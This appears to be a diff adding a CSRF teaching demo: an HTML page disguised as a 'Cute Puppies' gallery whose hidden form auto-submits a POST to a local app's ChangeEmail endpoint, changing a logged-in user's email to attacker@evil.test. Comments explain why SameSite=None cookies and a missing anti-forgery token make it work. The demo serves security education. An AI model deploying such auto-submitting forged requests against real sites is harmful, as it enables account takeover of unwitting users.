@@ -1,0 +1,43 @@
+<!doctype html>
+<!--
+  CSRF demo — "the attacker's website" (a DIFFERENT origin from the app).
+
+  Prerequisites:
+    1. Run the site locally (frontend https://localhost:3000, backend :5000).
+    2. In the app's "Account" card, LOG IN (this sets the SameSite=None session cookie).
+    3. Open THIS file in the same browser (double-click it — it loads as file://,
+       a different origin, which is the whole point).
+
+  What happens:
+    The hidden form below auto-submits a url-encoded POST to the app's VULNERABLE
+    endpoint. Because the session cookie is SameSite=None, the browser attaches it,
+    and the server — which checks no anti-forgery token — changes the victim's email.
+    A url-encoded form POST is a "simple" request, so no CORS preflight blocks it.
+
+  Then go back to the app, click "Refresh" in the Account card, and the email is now
+  attacker@evil.test.  (The token-protected endpoint cannot be exploited this way:
+  the attacker can't read the victim's vs_csrf cookie to forge the header.)
+
+  Note: the form targets https://localhost:3000 (the frontend origin) because that
+  is where the session cookie lives once you log in through the app.
+-->
+<html>
+  <head>
+    <title>Cute Puppies!</title>
+  </head>
+  <body style="font-family: sans-serif">
+    <h1>🐶 Cute Puppies Gallery</h1>
+    <p>Enjoy these adorable puppies while we load more…</p>
+
+    <form id="attack" action="https://localhost:3000/api/auth/ChangeEmail" method="POST">
+      <input type="hidden" name="NewEmail" value="attacker@evil.test" />
+    </form>
+
+    <p><em>(If you were logged in, your email was just changed. Check the app.)</em></p>
+
+    <script>
+      // Fire automatically, no interaction needed.
+      document.getElementById("attack").submit();
+    </script>
+  </body>
+</html>
